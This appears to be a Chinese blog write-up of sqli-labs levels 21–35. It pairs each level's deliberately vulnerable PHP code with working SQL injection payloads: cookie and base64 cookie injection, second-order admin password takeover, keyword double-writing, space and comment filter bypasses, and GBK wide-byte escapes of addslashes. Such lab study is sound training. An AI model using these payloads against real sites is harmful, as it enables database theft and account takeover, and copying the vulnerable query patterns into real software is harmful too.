<img src="https://gitee.com/TyRantXx/imgs/raw/master/imgs/image-20220327164820673.png" alt="image-20220327164820673" style="zoom:50%;" />

<p>这个页面中，有</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="subst">$cookee</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br></pre></td></tr></table></figure>

<p>所以我们可以抓第二次重定向的包修改cookie来操作</p>
<p><code>admin&#39;and updatexml(1,concat(0x0a,database()),1)--+</code>即可 ， 其他略</p>
<h1 id="Advanced-Injections"><a href="#Advanced-Injections" class="headerlink" title="Advanced Injections"></a>Advanced Injections</h1><h3 id="21-Cookie-Injection-Error-Based-complex-string"><a href="#21-Cookie-Injection-Error-Based-complex-string" class="headerlink" title="21-Cookie Injection- Error Based- complex - string"></a>21-Cookie Injection- Error Based- complex - string</h3><p>这里发现cookie被base64编码了，我们只需要将之前的payload也编码一下就行</p>
<p><code>admin&#39;) and updatexml(1,concat(0x0a, database()),1)#</code></p>
<p> &gt;&gt; <code>YWRtaW4nKSBhbmQgdXBkYXRleG1sKDEsY29uY2F0KDB4MGEsIGRhdGFiYXNlKCkpLDEpIw==</code></p>
<h3 id="22-Cookie-Injection-Error-Based-Double-Quotes-string"><a href="#22-Cookie-Injection-Error-Based-Double-Quotes-string" class="headerlink" title="22-Cookie Injection- Error Based- Double Quotes - string"></a>22-Cookie Injection- Error Based- Double Quotes - string</h3><p><code>admin&quot; and 1#</code></p>
<p>这里是双引号闭合了</p>
<p><code>admin&quot; and updatexml(1,concat(0x0a, database()),1)#</code></p>
<p>&gt;&gt;<code>YWRtaW4iIGFuZCB1cGRhdGV4bWwoMSxjb25jYXQoMHgwYSwgZGF0YWJhc2UoKSksMSkj</code></p>
<h3 id="23-Error-Based-no-comments"><a href="#23-Error-Based-no-comments" class="headerlink" title="23-Error Based- no comments"></a>23-Error Based- no comments</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$reg</span> = <span class="string">&quot;/#/&quot;</span>;</span><br><span class="line"><span class="variable">$reg1</span> = <span class="string">&quot;/--/&quot;</span>;</span><br><span class="line"><span class="variable">$replace</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$id</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$reg</span>, <span class="variable">$replace</span>, <span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$id</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$reg1</span>, <span class="variable">$replace</span>, <span class="variable">$id</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// connectivity </span></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>)</span><br><span class="line">	...</span><br></pre></td></tr></table></figure>

<p>把id中的注释符都过滤掉了,但是我们仍然可以闭合<code>&#39;&#39;</code>来解决</p>
<p>paylod: <code>1&#39; and updatexml(1,concat(0x0a,database()),1) and &#39;</code></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id<span class="operator">=</span><span class="string">&#x27;1&#x27;</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x0a</span>,database()),<span class="number">1</span>) <span class="keyword">and</span> <span class="string">&#x27;&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>只闭合前一个单引号会报错，所以我们将第二个单引号也闭合，就可以不用注释符出数据</p>
<p>接下来就是常规一条龙</p>
<p><code>1&#39; and updatexml(1,concat(0x0a,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;)),1) and &#39; </code></p>
<p><code>1&#39; and updatexml(1,concat(0x0a,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;)),1) and &#39;</code></p>
<p><code>1&#39; and updatexml(1,concat(0x0a,(select group_concat(username) from users)),1) and &#39;</code></p>
<p>以上是<strong>报错注入</strong>，但是会有字符串长度限制，可以用substr分段获取</p>
<hr>
<p>也可以用<strong>联合查询</strong></p>
<p>先确定字段数</p>
<p><code>-1&#39; union select 1,2,&#39;3</code></p>
<p><code>-1&#39; union select &#39;1&#39;, (select database()), &#39;3</code></p>
<p><code>-1&#39; union select &#39;1&#39;, (select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;), &#39;3</code></p>
<p><code>-1&#39; union select &#39;1&#39;, (select group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39;), &#39;3</code></p>
<p><code>-1&#39; union select &#39;1&#39;, (select group_concat(username) from users limit 0,1), &#39;3</code></p>
<h3 id="24-Second-Degree-Injections"><a href="#24-Second-Degree-Injections" class="headerlink" title="24-Second Degree Injections"></a>24-Second Degree Injections</h3><img src="https://gitee.com/TyRantXx/imgs/raw/master/imgs/image-20220403091029566.png" alt="image-20220403091029566" style="zoom:67%;" />

<img src="https://gitee.com/TyRantXx/imgs/raw/master/imgs/image-20220403091050057.png" alt="image-20220403091050057" style="zoom:67%;" />

<p>内容比较多, 先看Login按钮进入的login.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sqllogin</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$username</span> = <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">&quot;login_user&quot;</span>]);</span><br><span class="line">    <span class="variable">$password</span> = <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">&quot;login_password&quot;</span>]);</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$password</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="comment">//$sql = &quot;SELECT COUNT(*) FROM users WHERE username=&#x27;$username&#x27; and password=&#x27;$password&#x27;&quot;;</span></span><br><span class="line">    <span class="variable">$res</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;You tried to be real smart, Try harder!!!! :( &#x27;</span>);</span><br><span class="line">    <span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_row</span>(<span class="variable">$res</span>);</span><br><span class="line">    <span class="comment">//print_r($row) ;</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$row</span>[<span class="number">1</span>]) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$row</span>[<span class="number">1</span>];</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$login</span> = <span class="title function_ invoke__">sqllogin</span>();</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$login</span> == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>] = <span class="variable">$login</span>;</span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;Auth&quot;</span>, <span class="number">1</span>, <span class="title function_ invoke__">time</span>() + <span class="number">3600</span>); <span class="comment">/* expire in 15 Minutes */</span></span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: logged-in.php&#x27;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;bug offffff&quot;</span>;</span><br><span class="line">    .....</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>mysql_real_escape_string()</code> 函数转义 SQL 语句中使用的字符串中的特殊字符。</p>
<p>下列字符受影响：</p>
<ul>
<li>\x00</li>
<li>\n</li>
<li>\r</li>
<li>\</li>
<li>‘</li>
<li>“</li>
<li>\x1a</li>
</ul>
<p>如果成功，则该函数返回被转义的字符串。如果失败，则返回 false。</p>
<p>我们常用的闭合方法不好使了。</p>
<p>接下来看注册新用户界面</p>
<p>跟登陆一样，使用了转义函数，但是在Insert信息的时候保留了转义的内容，那么我们的用户名就可以<code>admin&#39; #</code></p>
<img src="https://gitee.com/TyRantXx/imgs/raw/master/imgs/image-20220403092850338.png" alt="image-20220403092850338" style="zoom:67%;" />

<p>这样 登陆的时候 这个时候我们如果登陆我们自己的<code>admin&#39; #</code>账户</p>
<p>然后修改密码，后台的sql语句会变成</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> users <span class="keyword">SET</span> PASSWORD<span class="operator">=</span><span class="string">&#x27;$pass&#x27;</span> <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span> #<span class="string">&#x27; and password=&#x27;</span>$curr_pass<span class="string">&#x27; </span></span><br></pre></td></tr></table></figure>

<p>这意味着我们如果更改<code>admin&#39; #</code>的密码，会将admin的密码改掉</p>
<blockquote>
<p>为什么这里获取username的时候不带转义符</p>
<p>因为后台此处username是从session中读取的，而session中的username是返回的<code>admin&#39; #</code>登陆时SQL语句返回的username, <code>\</code>转义符在sql语句中之后就没了，直接变成<code>username = admin&#39; #</code></p>
</blockquote>
<p><strong>因此我们就可以任意登陆admin的账号了</strong></p>
<h3 id="25-Trick-with-OR-amp-AND"><a href="#25-Trick-with-OR-amp-AND" class="headerlink" title="25 Trick with OR &amp; AND"></a>25 Trick with OR &amp; AND</h3><p>这里把or和and给过滤了，且不区分大小写</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$id</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/or/i&#x27;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$id</span>); <span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line">    <span class="variable">$id</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/AND/i&#x27;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$id</span>); <span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以如果要<code>1&#39; and 1=1;--+</code>，可以使用双写绕过<code>1&#39; aandnd 1=1;--+</code></p>
<p>paylod:</p>
<p><code>111&#39; union select 1,group_concat(schema_name),3 from infoorrmation_schema.schemata;%23</code></p>
<p>这里注意 <code>information_schema</code>中的or也会被替换,所以双写 <code>infoorrmation_schema</code></p>
<p>剩下 略</p>
<p><strong>此外</strong> 还可以用<code>||</code>代替<code>or</code>来报错注入</p>
<p>注意 如果使用<code>&amp;&amp;</code>要用<code>%26%26</code></p>
<p><code>1&#39; || updatexml(0,concat(0x0a,database()),0)%23</code></p>
<h3 id="25a-Trick-with-OR-amp-AND-Blind"><a href="#25a-Trick-with-OR-amp-AND-Blind" class="headerlink" title="25a-Trick with OR &amp; AND Blind"></a>25a-Trick with OR &amp; AND Blind</h3><p>和上一题一样，只不过变成整型了</p>
<p><code>?id=1 oorr 1=1%23</code></p>
<p><code>111 union select 1,group_concat(schema_name),3 from infoorrmation_schema.schemata;%23</code></p>
<p>略</p>
<h3 id="26-Trick-with-comments"><a href="#26-Trick-with-comments" class="headerlink" title="26 Trick with comments"></a>26 Trick with comments</h3><p>这次加上注释和空格也给过滤了</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/or/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);			<span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line">	<span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/and/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line">	<span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//strip out /*</span></span><br><span class="line">	<span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//Strip out --</span></span><br><span class="line">	<span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);			<span class="comment">//Strip out #</span></span><br><span class="line">	<span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\s]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//Strip out spaces</span></span><br><span class="line">	<span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\\\\]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	<span class="comment">//Strip out slashes</span></span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以用00截断来代替注释<code>1&#39;oorr&#39;1&#39;=&#39;1&#39;;%00</code></p>
<p>值得注意的是，虽然空格被过滤了，但是我们还是有几种方法绕过的。</p>
<p>上面这种加单引号可以，还可以用括号包裹<code>1&#39;oorr(1=1);%00</code></p>
<p>接下来来一段报错注入</p>
<p><code>1&#39;oorr(updatexml(0,concat(0x7e,database()),0));%00</code></p>
<p>结尾还可以换一种方式</p>
<p><code>1&#39;oorr(updatexml(0,concat(0x7e,database()),0))oorr&#39;1&#39;=&#39;1</code></p>
<p><code>1&#39;oorr(updatexml(0,concat(0x7e,(select(group_concat(schema_name))from(infoorrmation_schema.schemata))),0))oorr&#39;1&#39;=&#39;1</code></p>
<p><code>1&#39;oorr(updatexml(0,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=&#39;security&#39;))),0))oorr&#39;1&#39;=&#39;1</code></p>
<p>…</p>
<p><strong>这里用<code>%a0</code>也可以代替空格<code>1&#39;oorr%a01=1;%00</code></strong></p>
<h3 id="26a-Trick-with-comments"><a href="#26a-Trick-with-comments" class="headerlink" title="26a Trick with comments"></a>26a Trick with comments</h3><p>这题把<code>print_r(mysql_error());</code>给注释掉了，报错注入不好使了,就联合查询吧，用%a0代替空格</p>
<p><code>-111&#39;)%a0union%a0select(1),(select(group_concat(schema_name))from(infoorrmation_schema.schemata)),(3)||(&#39;0</code></p>
<p><code>-111&#39;)%a0union%a0select(1),(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=&#39;security&#39;)),(3)||(&#39;0</code></p>
<p>…略</p>
<h3 id="27-Trick-with-SELECT-amp-UNION"><a href="#27-Trick-with-SELECT-amp-UNION" class="headerlink" title="27 Trick with SELECT &amp; UNION"></a>27 Trick with SELECT &amp; UNION</h3><p>select,union过滤了</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$id</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\*]/&#x27;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$id</span>); <span class="comment">//strip out /*</span></span><br><span class="line">    <span class="variable">$id</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[--]/&#x27;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$id</span>); <span class="comment">//Strip out --.</span></span><br><span class="line">    <span class="variable">$id</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[#]/&#x27;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$id</span>); <span class="comment">//Strip out #.</span></span><br><span class="line">    <span class="variable">$id</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[ +]/&#x27;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$id</span>); <span class="comment">//Strip out spaces.</span></span><br><span class="line">    <span class="variable">$id</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/select/m&#x27;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$id</span>); <span class="comment">//Strip out spaces.</span></span><br><span class="line">    <span class="variable">$id</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[ +]/&#x27;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$id</span>); <span class="comment">//Strip out spaces.</span></span><br><span class="line">    <span class="variable">$id</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/union/s&#x27;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$id</span>); <span class="comment">//Strip out union</span></span><br><span class="line">    <span class="variable">$id</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/select/s&#x27;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$id</span>); <span class="comment">//Strip out select</span></span><br><span class="line">    <span class="variable">$id</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/UNION/s&#x27;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$id</span>); <span class="comment">//Strip out UNION</span></span><br><span class="line">    <span class="variable">$id</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/SELECT/s&#x27;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$id</span>); <span class="comment">//Strip out SELECT</span></span><br><span class="line">    <span class="variable">$id</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/Union/s&#x27;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$id</span>); <span class="comment">//Strip out Union</span></span><br><span class="line">    <span class="variable">$id</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/Select/s&#x27;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$id</span>); <span class="comment">//Strip out select</span></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意这里select被替换了好几次，所以双写绕过的时候要多几次</p>
<p>比如<code>-111&#39;%0auniounionn%0aselecsselectelectt%0a1,2,3||&#39;</code></p>
<p>这题我们不用双写，因为过滤对大小写的判断不严格</p>
<p><code>-111&#39;%0auNion%0aSeLECT%0a1,database(),3||&#39;</code></p>
<p><code>-111&#39;%0auNion%0aSeLECT%0a1,(seLect(group_concat(table_name))from(information_schema.tables)where(table_schema=&#39;security&#39;)),3||&#39;</code></p>
<p>…略</p>
<h3 id="27-Trick-with-SELECT-amp-UNION-1"><a href="#27-Trick-with-SELECT-amp-UNION-1" class="headerlink" title="27 Trick with SELECT &amp; UNION"></a>27 Trick with SELECT &amp; UNION</h3><p>换个闭合方式，其余同上</p>
<p><code>-111&quot;%0aUnioN%0aseLect%0a1,2,3|| &quot;</code></p>
<h3 id="28-Trick-with-SELECT-amp-UNION"><a href="#28-Trick-with-SELECT-amp-UNION" class="headerlink" title="28 Trick with SELECT &amp; UNION"></a>28 Trick with SELECT &amp; UNION</h3><p>这次是把union select合起来过滤</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$id</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\*]/&#x27;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$id</span>); <span class="comment">//strip out /*</span></span><br><span class="line">    <span class="variable">$id</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[--]/&#x27;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$id</span>); <span class="comment">//Strip out --.</span></span><br><span class="line">    <span class="variable">$id</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[#]/&#x27;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$id</span>); <span class="comment">//Strip out #.</span></span><br><span class="line">    <span class="variable">$id</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[ +]/&#x27;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$id</span>); <span class="comment">//Strip out spaces.</span></span><br><span class="line">    <span class="comment">//$id= preg_replace(&#x27;/select/m&#x27;,&quot;&quot;, $id);                    //Strip out spaces.</span></span><br><span class="line">    <span class="variable">$id</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[ +]/&#x27;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$id</span>); <span class="comment">//Strip out spaces.</span></span><br><span class="line">    <span class="variable">$id</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/union\s+select/i&#x27;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$id</span>); <span class="comment">//Strip out UNION &amp; SELECT.</span></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们可以组合起来双写绕过</p>
<p><code>-111&#39;)%0aunion%0aunion%0aselectselect%0a1,database(),3 || (&#39;</code></p>
<p>…略</p>
<h3 id="28a-Trick-with-SELECT-amp-UNION"><a href="#28a-Trick-with-SELECT-amp-UNION" class="headerlink" title="28a Trick with SELECT &amp; UNION"></a>28a Trick with SELECT &amp; UNION</h3><p>这次过滤只剩<code>$id= preg_replace(&#39;/union\s+select/i&#39;,&quot;&quot;, $id); </code>了，随便绕</p>
<p><code>-111&#39;) union union select select 1,database(),3|| (&#39;</code></p>
<p>…略</p>
<h3 id="29-31-WAF绕过"><a href="#29-31-WAF绕过" class="headerlink" title="29-31 WAF绕过"></a>29-31 WAF绕过</h3><p>ubuntu上没弄jsp环境 略</p>
<h3 id="32-Bypass-addslashes"><a href="#32-Bypass-addslashes" class="headerlink" title="32 Bypass addslashes()"></a>32 Bypass addslashes()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_addslashes</span>(<span class="params"><span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$string</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">preg_quote</span>(<span class="string">&#x27;\\&#x27;</span>) . <span class="string">&#x27;/&#x27;</span>, <span class="string">&quot;\\\\\\&quot;</span>, <span class="variable">$string</span>); <span class="comment">//escape any backslash</span></span><br><span class="line">    <span class="variable">$string</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/\&#x27;/i&#x27;</span>, <span class="string">&#x27;\\\&#x27;&#x27;</span>, <span class="variable">$string</span>); <span class="comment">//escape single quote with a backslash</span></span><br><span class="line">    <span class="variable">$string</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/\&quot;/&#x27;</span>, <span class="string">&quot;\\\&quot;&quot;</span>, <span class="variable">$string</span>); <span class="comment">//escape double quote with a backslash</span></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$string</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>preg_quote()</code> 需要参数 str 并向其中 每个正则表达式语法中的字符前增加一个反斜线。 </p>
<p>正则表达式特殊字符有： . \ + * ? [ ^ ] $ ( ) { } &#x3D; ! &lt; &gt; | : -</p>
<p><code>preg_replace</code> 函数执行一个正则表达式的搜索和替换。</p>
<p>这题将<code>\  &#39;  &quot;</code>都给转义了</p>
<p>来一发宽字节注入</p>
<p><code>-1%df&#39; union select 1,2,3; %23</code></p>
<p>后台在给<code>&#39;</code>转义后变成了 <code>\&#39;</code>,所以sql语句变成了<code>-1%df%5c&#39; union select 1,2,3; %23</code></p>
<p>%df%5c在gbk编码下成了<code>運</code>,后面的<code>&#39;</code>就可以正常闭合了</p>
<p><code>-1%df&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=0x7365637572697479),3; %23</code></p>
<p>这里注意where后面语句可以用十六进制来绕过单引号的限制</p>
<h3 id="33-Bypass-addslashes"><a href="#33-Bypass-addslashes" class="headerlink" title="33 Bypass addslashes()"></a>33 Bypass addslashes()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_addslashes</span>(<span class="params"><span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$string</span>= <span class="title function_ invoke__">addslashes</span>(<span class="variable">$string</span>);    </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$string</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>和上一题一模一样，只是换成了php自带的addslashes</p>
<p>addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。</p>
<p>预定义字符是：</p>
<ul>
<li>单引号（’）</li>
<li>双引号（”）</li>
<li>反斜杠（\）</li>
<li>NULL</li>
</ul>
<h3 id="34-Bypass-Add-SLASHES"><a href="#34-Bypass-Add-SLASHES" class="headerlink" title="34 Bypass Add SLASHES"></a>34 Bypass Add SLASHES</h3><p>这次还是对password和uname进行addslashes, 但是这次是post传参，<br>Hackbar在处理宽字节注入的时候对于’%’有点问题，具体可见<br><a target="_blank" rel="noopener" href="https://github.com/0140454/hackbar/issues/4">https://github.com/0140454/hackbar/issues/4</a> ,所以我们抓包解决<br>paylod: <code>passwd=12&amp;uname=-111%df&#39;+union+select+1,database();%23</code></p>
<h3 id="35-why-care-for-addslashes"><a href="#35-why-care-for-addslashes" class="headerlink" title="35 why care for addslashes()"></a>35 why care for addslashes()</h3><p>这次id是整型，不用单引号</p>
<p><code>-1111 union select 1,database(),3;--+</code></p>
<p><code>-1111 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=0x7365637572697479),3;--+</code></p>
<p>…</p>
